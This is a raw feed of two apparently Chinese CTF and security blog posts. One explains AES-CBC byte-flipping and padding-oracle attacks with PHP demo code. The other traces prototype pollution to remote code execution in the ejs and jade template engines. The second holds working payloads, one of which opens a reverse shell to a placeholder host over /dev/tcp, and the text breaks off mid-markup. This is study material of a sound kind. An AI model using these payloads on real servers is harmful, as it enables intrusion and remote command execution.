        <content type="html"><![CDATA[<h2 id="0x00-AES-CBC简述"><a href="#0x00-AES-CBC简述" class="headerlink" title="0x00 AES-CBC简述"></a>0x00 AES-CBC简述</h2><ul><li><p><strong>加密:</strong></p><p><img src="082113_1459_CBCByteFlip1.png" alt="img">  </p></li></ul><p>Plaintext: 明文,以16字节为单位分组.最后一块不满16字节的需要用<a href="https://blog.csdn.net/u010603798/article/details/98586594">padding填充</a></p><blockquote><p> 以分组8个字节为例：需要填充n个字节，则n个字节都填充0x0n。如果恰好全满，填充8个0x08组成新块。OFB和CFB不需要填充 </p><p>AES填充遵循  PKCS #7 </p></blockquote><p>IV: 初始化向量(16字节),初始向量不同,不同明文得到的密文也不相同</p><p>key: 密钥</p><p>Ciphertext: 密文.</p><p>加密过程:</p><p> Ciphertext-0 = Encrypt(Plaintext-0 XOR IV) (first block)</p><p> Ciphertext-N= Encrypt(Plaintext-N XOR Ciphertext-N-1) </p><ul><li><p>解密</p><p><img src="082113_1459_CBCByteFlip2.png" alt="img"> </p></li></ul><p>解密过程:</p><p> Plaintext-0 = Decrypt(Ciphertext-0) XOR IV </p><p> Plaintext-N= Decrypt(Ciphertext) XOR Ciphertext-N-1</p><h2 id="0x01-CBC-Byte-Flipping-Attack原理"><a href="#0x01-CBC-Byte-Flipping-Attack原理" class="headerlink" title="0x01 CBC Byte Flipping Attack原理"></a>0x01 CBC Byte Flipping Attack原理</h2><p> <img src="082113_1459_CBCByteFlip3.jpg" alt="img"> </p><p>原理: 解密过程是用 Ciphertext-N-1 来帮助解密 Ciphertext-N的,如果控制了 Ciphertext-N-1 那么也可以控制解出来的Plaintext-N,达到篡改消息的目的.</p><p>举例:</p><p>对明文 <code>a:2:&#123;s:4:&quot;name&quot;;s:6:&quot;sdsdsd&quot;;s:8:&quot;greeting&quot;;s:20:&quot;echo &#39;Hello sdsdsd!&#39;&quot;;&#125;</code></p><p>尝试把<code>s:6</code>改为<code> s:7</code></p><p>加密时的明文分组如下,要修改的地方位于block2的第三个字节,需要更改密文的block1的第三个字节,即enc[2]</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Block 1: a:2:&#123;s:4:&quot;name&quot;;</span><br><span class="line">Block 2: s:6:”sdsdsd”;s:8</span><br><span class="line">Block 3: :&quot;greeting&quot;;s:20:</span><br><span class="line">Block 4: “echo ‘Hello sd</span><br><span class="line">Block 5: sdsd!&#39;&quot;;&#125; </span><br></pre></td></tr></table></figure><p>脚本如下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">define(<span class="string">&#x27;MY_AES_KEY&#x27;</span>, <span class="string">&quot;abcdef0123456789&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aes</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$encrypt</span>,<span class="variable">$iv</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$aes</span> = mcrypt_module_open(MCRYPT_RIJNDAEL_128, <span class="string">&#x27;&#x27;</span>, MCRYPT_MODE_CBC, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    mcrypt_generic_init(<span class="variable">$aes</span>, MY_AES_KEY, <span class="variable">$iv</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$encrypt</span> ? mcrypt_generic(<span class="variable">$aes</span>,<span class="variable">$data</span>) : mdecrypt_generic(<span class="variable">$aes</span>,<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">define(<span class="string">&#x27;MY_MAC_LEN&#x27;</span>, <span class="number">40</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$iv</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> aes(<span class="variable">$data</span>, <span class="literal">true</span>,<span class="variable">$iv</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$iv</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = rtrim(aes(<span class="variable">$data</span>, <span class="literal">false</span>,<span class="variable">$iv</span>), <span class="string">&quot;\0&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$v</span> = <span class="string">&quot;a:2:&#123;s:4:\&quot;name\&quot;;s:6:\&quot;sdsdsd\&quot;;s:8:\&quot;greeting\&quot;;s:20:\&quot;echo &#x27;Hello sdsdsd!&#x27;\&quot;;&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Plaintext before attack: <span class="subst">$v</span>\n&quot;</span>;</span><br><span class="line"><span class="variable">$enc</span> = @encrypt(<span class="variable">$v</span>,<span class="string">&quot;1234567891234567&quot;</span>);</span><br><span class="line"><span class="variable">$enc</span>[<span class="number">2</span>] =  chr(ord(<span class="variable">$enc</span>[<span class="number">2</span>]) ^ ord(<span class="string">&quot;6&quot;</span>) ^ ord (<span class="string">&quot;7&quot;</span>));</span><br><span class="line"><span class="variable">$b</span> = @decrypt(<span class="variable">$enc</span>,<span class="string">&quot;1234567891234567&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Plaintext AFTER attack : <span class="subst">$b</span>\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行结果如下,篡改了block的明文,条件是明文已知</p><p><img src="1614063423227.png" alt="1614063423227"></p><p>虽然篡改了block2的明文,但是block1的明文也受到了影响,如果初始化向量可控,那么很显然也可以控制block1使其恢复正常.</p><p>iv篡改方式如下:</p><p> MIV =  IV XOR Wrong-Ciphertext-0 XOR  Ciphertext-0</p><p>解密过程:</p><p>Plaintext-0 = Decrypt(MIV XOR Wrong-Ciphertext-0)</p><p>​                    = Decrypt(IV XOR Wrong-Ciphertext-0 XOR  Ciphertext-0 XOR Wrong-Ciphertext-0)</p><p>​                    = Decrypt(IV XOR  Ciphertext-0)</p><p>​                    = Plaintext-0</p><p>脚本:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$iv</span>=<span class="string">&quot;1234567891234567&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">16</span>;<span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$iv</span>[<span class="variable">$i</span>] = chr(ord(<span class="variable">$b</span>[<span class="variable">$i</span>]) ^ ord(<span class="variable">$iv</span>[<span class="variable">$i</span>]) ^ ord(<span class="variable">$v</span>[<span class="variable">$i</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = @decrypt(<span class="variable">$enc</span>,<span class="variable">$iv</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Plaintext Third attack : <span class="subst">$c</span>\n&quot;</span>;</span><br></pre></td></tr></table></figure><p>运行结果,这样就在不影响别的块的情况下,篡改了明文,条件是初始化向量IV可控,明文已知</p><p><img src="1614063923928.png" alt="1614063923928"></p><h2 id="0x02-Padding-oracle-attack"><a href="#0x02-Padding-oracle-attack" class="headerlink" title="0x02  Padding oracle attack"></a>0x02  Padding oracle attack</h2><p>详细内容参考 <a href="https://www.freebuf.com/articles/database/151167.html">https://www.freebuf.com/articles/database/151167.html</a></p><p> Padding Oracle Attack是针对CBC链接模式的攻击，和具体的加密算法无关 </p><ul><li>padding - <strong>PKCS #5</strong></li></ul><blockquote><p>引自<a href="https://www.freebuf.com/articles/database/151167.html">https://www.freebuf.com/articles/database/151167.html</a></p></blockquote><p>既然CBC模式涉及到分组，那么就一定存在不能恰好被平均分组的情况，也就是说最后一组的长度可能不够长，这时候就需要对最后一组分组进行填充，使其和其他分组保持长度一致，这时候就需要了解一下填充所要遵循的规则了。对于采用DES算法进行加密的内容，填充规则遵循的是PKCS #5，而AES则是PKCS #7，实际上两者的要求基本一样，区别在于PKCS #5填充是八字节分组而PKCS #7是十六字节，换句话说就是填充的最大位数不一样，一个是0到8一个是0到16，下面我介绍一下PKCS #5的要求。为了保证每一组的长度一致，做法是在最后一个分组后填充一个固定的值，这个值的大小为填充的字节总数（十六进制表示）。例如最后还差4个字符，则填充四个0×04在最后，对于PKCS #5最多填充八位也就是八个0x08，所以填充字节的取值范围是0x01到0x08。<strong>需注意即便分组内容能正好平均分为n组</strong>，<strong>仍需要在最后一组后面填充一个八位分组</strong>，如下图 </p><p> <img src="15083384721064.png!small" alt="Padding oracle attack详细解析"> </p><ul><li> Intermediary Value </li></ul><p>前面提到的CBC模式解密 </p><p>Plaintext-N= Decrypt(Ciphertext-N) XOR Ciphertext-N-1 </p><p> Intermediary Value  = Decrypt(Ciphertext-N) </p><p>如果 Intermediary Value 和Ciphertext-N-1 已知,则显然可以推出明文.</p><p>反过来,如果知道明文和IV,也可以猜解出Intermediary Value</p><p>明文当然不可能已知,但是可以知道的是padding在不符合标准的时候,程序会返回异常.</p><p>可以假设padding长度为1,填充的padding应为 0x01,通过枚举IV最后一个字节,可以枚举出程序不报错的情况.</p><blockquote><p>不报错仅仅意味着padding正确</p></blockquote><p>且这个值只有一个. 然后假设padding长度为2,3,4,字节依次枚举</p><p> <img src="20160926214719743" alt="这里写图片描述">  </p><blockquote><p>详细枚举过程参考 <a href="https://blog.csdn.net/qq_19876131/article/details/52674589">https://blog.csdn.net/qq_19876131/article/details/52674589</a></p></blockquote><ul><li><p>得到了Intermediary Value ,和IV进行异或就可以得到明文, 也就获得了最后一块的明文信息.</p></li><li><p>舍弃掉最后一组密文，只提交第一组到倒数第二组密文，通过构造倒数第三组密文得到倒数第二组密文的明文，最后我们便可以得到全部的明文 </p><p>攻击成立的两个重要假设前提 :</p></li></ul><p>（1） 攻击者能够控制密文（Ciphertext），以及附带在密文前面的IV（初始化向量）</p><p>（2） 攻击者能够触发密文的解密过程，且能够知道密文的解密结果</p><p>通用exp, <a href="https://github.com/mpgn/Padding-oracle-attack/blob/master/exploit.py">https://github.com/mpgn/Padding-oracle-attack/blob/master/exploit.py</a></p><h2 id="0x03-NJCTF-2017-web300-Be-Admin"><a href="#0x03-NJCTF-2017-web300-Be-Admin" class="headerlink" title="0x03 NJCTF 2017 web300 Be Admin"></a>0x03 NJCTF 2017 web300 Be Admin</h2><blockquote><p>未知明文情况下的attack</p></blockquote><p><a href="https://github.com/L0nm4r/njctf_2017_web_be_admin">https://github.com/L0nm4r/njctf_2017_web_be_admin</a></p><p><img src="1614067189375.png" alt="1614067189375"></p><p>通过备份可以拿到代码.<a href="https://github.com/L0nm4r/njctf_2017_web_be_admin/blob/master/src/index.php">https://github.com/L0nm4r/njctf_2017_web_be_admin/blob/master/src/index.php</a></p><p>exp: <a href="https://github.com/L0nm4r/njctf_2017_web_be_admin/blob/master/exp.py">https://github.com/L0nm4r/njctf_2017_web_be_admin/blob/master/exp.py</a></p><p>太菜了,不会写.挖坑,待填.</p><h2 id="0x04-other"><a href="#0x04-other" class="headerlink" title="0x04 other"></a>0x04 other</h2><p>ebctf-2013-web400-cryptoaescbchmac.无法控制IV,但是可以构造命令执行,前几个block不会影响后面命令的执行. <a href="https://codezen.fr/2013/08/05/ebctf-2013-web400-cryptoaescbchmac-write-up/">https://codezen.fr/2013/08/05/ebctf-2013-web400-cryptoaescbchmac-write-up/</a> </p><h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><ul><li><p>AES加密 填充方式 <a href="https://blog.csdn.net/u010603798/article/details/98586594">https://blog.csdn.net/u010603798/article/details/98586594</a></p></li><li><p><a href="https://resources.infosecinstitute.com/topic/cbc-byte-flipping-attack-101-approach/">https://resources.infosecinstitute.com/topic/cbc-byte-flipping-attack-101-approach/</a></p></li><li><p><a href="https://codezen.fr/2013/08/05/ebctf-2013-web400-cryptoaescbchmac-write-up/">https://codezen.fr/2013/08/05/ebctf-2013-web400-cryptoaescbchmac-write-up/</a></p></li><li><p><a href="https://blog.csdn.net/LeeHDsniper/article/details/81089480">https://blog.csdn.net/LeeHDsniper/article/details/81089480</a></p></li><li><p><a href="https://codezen.fr/2013/08/05/ebctf-2013-web400-cryptoaescbchmac-write-up/">https://codezen.fr/2013/08/05/ebctf-2013-web400-cryptoaescbchmac-write-up/</a> </p></li><li><p><a href="https://blog.csdn.net/qq_19876131/article/details/61918399">https://blog.csdn.net/qq_19876131/article/details/61918399</a></p></li><li><p><a href="https://www.freebuf.com/articles/database/151167.html">https://www.freebuf.com/articles/database/151167.html</a></p></li><li><p><a href="https://blog.csdn.net/qq_19876131/article/details/52674589">https://blog.csdn.net/qq_19876131/article/details/52674589</a></p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>几个node模板引擎的原型链污染分析</title>
      <link href="2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/"/>
      <url>2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>跟着网上文章分析复现一遍ejsRCE链,然后尝试自己探究一下jadeRCE链</p><p>RCE 的前提是要有原型链污染</p><p>lodash 原型链污染demo</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> _= <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> malicious_payload = <span class="string">&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;oops&quot;:&quot;It works !&quot;&#125;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = &#123;&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;Before : &quot;</span> + a.oops);</span><br><span class="line">_.merge(&#123;&#125;, <span class="built_in">JSON</span>.parse(malicious_payload));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;After : &quot;</span> + a.oops);</span><br></pre></td></tr></table></figure><h2 id="0x01-ejs"><a href="#0x01-ejs" class="headerlink" title="0x01 ejs"></a>0x01 ejs</h2><p>环境和调试代码参考 <a href="https://xz.aliyun.com/t/7075#toc-5">https://xz.aliyun.com/t/7075#toc-5</a></p><p>逐步跟踪找到渲染模板的compile函数,参考<a href="https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/">Express+lodash+ejs: 从原型链污染到RCE</a></p><p>从index.js::res.render开始跟进</p><p><img src="1613884853031.png" alt="1613884853031"></p><p>进入到app.render</p><p><img src="1613884939865.png" alt="1613884939865"></p><p>然后进入到app.render里的tryrender函数</p><p><img src="1613884975131.png" alt="1613884975131"></p><p>view.render. </p><p><img src="1613885027494.png" alt="1613885027494"></p><p>然后看到在View.render开始渲染.从这个函数进入ejs模块</p><p><img src="1613885129648.png" alt="1613885129648"></p><p>继续跟进到renderFile.里面有tryHandleCache函数</p><p><img src="1613885150428.png" alt="1613885150428"></p><p>继续跟进到handleCache函数,</p><p><img src="1613885224116.png" alt="1613885224116"></p><p>在这找到了渲染模板的compile函数</p><p><img src="1613885294361.png" alt="1613885294361"></p><p>然后在这个函数里实例化了一个模板类,然后编译.</p><p>继续跟踪编译函数</p><p><img src="1613885416704.png" alt="1613885416704"></p><p>可以发现几处关键代码, </p><p>正常情况下<code>opts.outputFunctionName</code>为undefined.可以通过原型链污染控制其值,然后拼接到prepended.</p><p>prepended在后面传递给了this.source.</p><p><img src="1613886363413.png" alt="1613886363413"></p><p>this.source在后面作为构造函数参数传递给fn</p><p><img src="1613886398105.png" alt="1613886398105"></p><p>fn最终通过fn.apply()被调用.</p><p>所以控制opts.outputFunctionName就可以注入任意代码.</p><p>payload:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/6666 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;_tmp1;global.process.mainModule.require(\&#x27;child_process\&#x27;).exec(\&#x27;calc\&#x27;);var __tmp2&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="0x02-jade"><a href="#0x02-jade" class="headerlink" title="0x02 jade"></a>0x02 jade</h2><h3 id="1-先贴两个利用链"><a href="#1-先贴两个利用链" class="headerlink" title="1.先贴两个利用链"></a>1.先贴两个利用链</h3><p>这个之前见到了两个利用链,但是做ctfshow题目的时候都不能利用.</p><p>先贴出利用链:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span></span><br><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;self&quot;</span>:<span class="string">&quot;true&quot;</span>,<span class="string">&quot;line&quot;</span>:<span class="string">&quot;2,jade_debug[0].filename));return global.process.mainModule.require(\&#x27;child_process\&#x27;).exec(\&#x27;calc\&#x27;)//&quot;</span>&#125;&#125;</span><br><span class="line"><span class="number">2.</span> </span><br><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;self&quot;</span>:<span class="number">1</span>,<span class="string">&quot;line&quot;</span>:<span class="string">&quot;global.process.mainModule.require(\&#x27;child_process\&#x27;).exec(\&#x27;calc\&#x27;)&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="2-利用链分析"><a href="#2-利用链分析" class="headerlink" title="2. 利用链分析"></a>2. 利用链分析</h3><p>参考 <a href="https://xz.aliyun.com/t/7025">https://xz.aliyun.com/t/7025</a></p><ul><li>环境搭建</li></ul><p>app.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> lodash= <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"><span class="keyword">var</span> router = express.Router();</span><br><span class="line"></span><br><span class="line">app.set(<span class="string">&#x27;views&#x27;</span>, path.join(__dirname));</span><br><span class="line">app.engine(<span class="string">&#x27;jade&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;jade&#x27;</span>).__express);</span><br><span class="line">app.set(<span class="string">&quot;view engine&quot;</span>, <span class="string">&quot;jade&quot;</span>);</span><br><span class="line"></span><br><span class="line">app.use(express.json()).use(express.urlencoded(&#123;</span><br><span class="line">    extended: <span class="literal">false</span></span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> malicious_payload = <span class="string">&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;self&quot;:&quot;true&quot;,&quot;line&quot;:&quot;1000000,jade_debug[0].filename));return global.process.mainModule.require(\&#x27;child_process\&#x27;).exec(\&#x27;calc\&#x27;)//&quot;&#125;&#125;&#x27;</span>;</span><br><span class="line">lodash.merge(&#123;&#125;, <span class="built_in">JSON</span>.parse(malicious_payload));</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    res.render(<span class="string">&#x27;./index.jade&#x27;</span>, &#123;</span><br><span class="line">        title: <span class="string">&#x27;hello&#x27;</span>,</span><br><span class="line">        name: <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line">app.use(<span class="string">&#x27;/&#x27;</span>, router)</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>, <span class="function">() =&gt;</span> <span class="built_in">console</span>.log(<span class="string">&#x27;Example app listening on port http://127.0.0.1:3000 !&#x27;</span>))</span><br></pre></td></tr></table></figure><p>index.jade</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">h1&#x3D; title</span><br><span class="line">p hello #&#123;name&#125;</span><br></pre></td></tr></table></figure><p>直接利用上面的payload会报错</p><p><img src="1613890867473.png" alt="1613890867473"></p><p>先调试分析漏洞利用点</p><p>进入jade模块. <code>res.render=&gt;app.render=&gt;tryRender=&gt;view.render=&gt;this.engine</code>,和ejs差不多.</p><p><img src="1613891162165.png" alt="1613891162165"></p><p>入口是renderFile函数.进入</p><p><img src="1613891209987.png" alt="1613891209987"></p><p>注意rendfile函数返回值可执行.进入handleTemplateCache</p><p><img src="1613891248155.png" alt="1613891248155"></p><p>进入compile函数.</p><p><img src="1613891301546.png" alt="1613891301546"></p><p>这点和ejs不同,在compile之前会有parse解析.</p><p>然后可以看到结果返回到parsed,又传递给了fn.</p><p>先不管parse函数,继续向下看代码</p><p><img src="1613891409260.png" alt="1613891409260"></p><p>可以看到parse后的返回值最终会被当作代码执行.</p><p>然后进入parse,审计是否返回值中有可控部分.</p><p><img src="1613891512195.png" alt="1613891512195"></p><p>parse函数内部可以看到先parse再compile.parse结果最终会被拼接到外层parse函数返回值部分</p><p><img src="1613891640298.png" alt="1613891640298"></p><p>然后进入compile函数进行审计</p><p><img src="1613891684445.png" alt="1613891684445"></p><p>可以看到compile函数返回的是buf.</p><p>步入代码,this.visit</p><p><img src="1613891751528.png" alt="1613891751528"></p><p>发现可控的node.line可以被push到buf中.条件是this.debug=True.</p><p><img src="1613892764488.png" alt="1613892764488"></p><p>可以发现payload是成功拼接到buf里的,但是会报错</p><p><img src="1613894266904.png" alt="1613894266904"></p><p>跟进报错信息可以发现在Object.exports.renderFile =&gt; handleTemplateCache=&gt;Object.exports.compile=&gt;parse=&gt;addWith处.</p><p><img src="1613894409463.png" alt="1613894409463"></p><p>令options.self为true可避免进入addWith函数.网上的一些文章payload分析也就到此,但是发现这个payload打不通且没有出现很明显的报错,这点留到后面分析.</p><p>很偶然的情况下我对模板做出了修改,改成如下的,然后发现就可以造成RCE了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">h1 title: #&#123;title&#125;</span><br><span class="line">p hello #&#123;name&#125;</span><br></pre></td></tr></table></figure><p><img src="1613892847603.png" alt="1613892847603"></p><p>初步猜测污染self太粗暴,会影响<code>h1= title</code>这种模板渲染方式(不确定猜测是否正确.)</p><h3 id="3-Ctfshow题目分析"><a href="#3-Ctfshow题目分析" class="headerlink" title="3. Ctfshow题目分析"></a>3. Ctfshow题目分析</h3><p>ctfshow有一道题目也是考察jade链的利用.</p><p>只贴模板信息(其余的都差不多)</p><p>layout.jade</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">doctype html</span><br><span class="line">html</span><br><span class="line">  head</span><br><span class="line">    title&#x3D; title</span><br><span class="line">  body</span><br><span class="line">    block content</span><br></pre></td></tr></table></figure><p>index.jade</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">extends layout</span><br><span class="line"></span><br><span class="line">block content</span><br><span class="line">  h1&#x3D; title</span><br><span class="line">  p Welcome to #&#123;title&#125;</span><br></pre></td></tr></table></figure><p>将上面分析得到的payload打入.报了如下错误.</p><p><img src="1613973792970.png" alt="1613973792970"></p><p>跟着调用栈分析.最终可以找到在visitNode函数.会有node.type为undefined的情况,</p><p><img src="1613974028363.png" alt="1613974028363"></p><p>正常情况下node.type值为tag/Block等等,然后调用相应函数.</p><p><img src="1613973894835.png" alt="1613973894835"></p><p>解决方法就是把type也污染了.全部测试了一下,发现visitxxx函数及可用的如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">visitAttributes</span><br><span class="line">visitEach</span><br><span class="line">visitCode √</span><br><span class="line">visitBlockComment√</span><br><span class="line">visitComment√</span><br><span class="line">visitText</span><br><span class="line">visitFilter</span><br><span class="line">visitTag</span><br><span class="line">visitMixin</span><br><span class="line">visitDoctype√</span><br><span class="line">visitMixinBlock√</span><br><span class="line">visitBlock</span><br><span class="line">visitLiteral</span><br><span class="line">visitWhen</span><br><span class="line">visitCase</span><br><span class="line">visitNode</span><br></pre></td></tr></table></figure><p>payload举例</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;type&quot;</span>:<span class="string">&quot;Code&quot;</span>,<span class="attr">&quot;self&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;line&quot;</span>:<span class="string">&quot;global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;)&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="4-填坑"><a href="#4-填坑" class="headerlink" title="4.填坑."></a>4.填坑.</h3><p>最开始的模板.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">h1&#x3D; title</span><br><span class="line">p hello #&#123;name&#125;</span><br></pre></td></tr></table></figure><p>执行payload会报如下错误.</p><p><img src="1613977699618.png" alt="1613977699618"></p><p>这个具体哪报错也没分析到,但是尝试污染title.</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;title&quot;:&quot;test&quot;,&quot;self&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;calc&#39;)&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><p>发现就成功了.</p><p><img src="1613977799878.png" alt="1613977799878"></p><h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结."></a>0x03 总结.</h2><p>原型链污染的精髓:undefined属性/值</p><p>下面梳理一下上面有关jade RCE链的payload</p><p>针对普通的模板:只需要污染self和line.</p><ul><li><p>包括下面这种</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 